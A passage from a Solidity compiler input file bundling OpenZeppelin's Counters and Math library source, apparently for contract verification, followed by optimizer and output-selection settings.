   require(value > 0, \"Counter: decrement overflow\");\n        unchecked {\n            counter._value = value - 1;\n        }\n    }\n\n    function reset(Counter storage counter) internal {\n        counter._value = 0;\n    }\n}\n"
    },
    "@openzeppelin/contracts/utils/math/Math.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/math/Math.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Standard math utilities missing in the Solidity language.\n */\nlibrary Math {\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    /**\n     * @dev Returns the smallest of two numbers.\n     */\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a < b ? a : b;\n    }\n\n    /**\n     * @dev Returns the average of two numbers. The result is rounded towards\n     * zero.\n     */\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\n        // (a + b) / 2 can overflow.\n        return (a & b) + (a ^ b) / 2;\n    }\n\n    /**\n     * @dev Returns the ceiling of the division of two numbers.\n     *\n     * This differs from standard division with `/` in that it rounds up instead\n     * of rounding down.\n     */\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\n        // (a + b - 1) / b can overflow on addition, so we distribute.\n        return a / b + (a % b == 0 ? 0 : 1);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}